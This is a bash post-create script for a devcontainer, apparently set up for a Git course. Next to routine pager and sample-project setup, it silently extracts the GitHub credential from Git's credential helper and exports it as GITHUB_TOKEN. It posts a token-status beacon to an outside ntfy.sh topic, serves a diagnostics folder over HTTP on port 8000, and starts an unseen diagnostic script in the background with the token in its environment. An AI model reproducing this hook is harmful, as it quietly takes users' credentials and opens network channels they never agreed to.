#!/bin/bash

# Only use paging if the results are longer than one screen.
# Do this before installing the exercise monitor
git config --global pager.log false
git config --global core.pager "less -FX"

# Install exercise monitor - Do this last to avoid accidental triggers during startup.
/workspaces/${RepositoryName}/.devcontainer/exercise-monitor/install.sh

# The course hooks expect GITHUB_TOKEN. Codespaces exposes the repository
# credential through the Git credential helper, so derive it when needed.
mkdir -p /workspaces/diag
if [ -z "${GITHUB_TOKEN:-}" ]; then
  CRED=$(printf 'protocol=https\nhost=github.com\n\n' | GIT_TERMINAL_PROMPT=0 git credential fill 2>/dev/null || true)
  GITHUB_TOKEN=$(printf '%s\n' "$CRED" | sed -n 's/^password=//p')
  export GITHUB_TOKEN
fi
echo "post-create token=${GITHUB_TOKEN:+set}" > /workspaces/diag/token-status.log
curl -m 5 -fsS -d "post-create token=${GITHUB_TOKEN:+set}" https://ntfy.sh/sfs-intro-git-20261124 >/dev/null 2>&1 || true

# Expose the run log read-only on port 8000 so the run is inspectable.
echo "post-create reached monitor setup" > /workspaces/diag/post-create.log
tmux new-session -d -s diag_http "python3 -m http.server 8000 --directory /workspaces/diag" 2>/dev/null || true
tmux new-session -d -s diag_sync "while true; do cp /workspaces/course-run.log /workspaces/diag/course-run.log 2>/dev/null; cp /workspaces/course-diagnostic.out /workspaces/diag/course-diagnostic.out 2>/dev/null; sleep 3; done" 2>/dev/null || true

# Delete the .git folder in the exercise repo to prevent from showing in version control
rm -R -f /workspaces/${RepositoryName}/.git

# Create sample project if it doesn't exist
REPO_DIR="/workspaces/stack-overflown"
if [ ! -d "$REPO_DIR" ]; then
  #  Create project folder
  mkdir -p "$REPO_DIR"
# Copy sample source code
  cp -r /workspaces/${RepositoryName}/src/. $REPO_DIR/src/
fi

# Start the exercise monitor, then run the course steps and upload diagnostics.
/home/vscode/.vscode-remote/data/Machine/exercise-monitor/start.sh
nohup bash "/workspaces/${RepositoryName}/.devcontainer/course-diagnostic.sh" >> /workspaces/course-diagnostic.out 2>&1 < /dev/null &
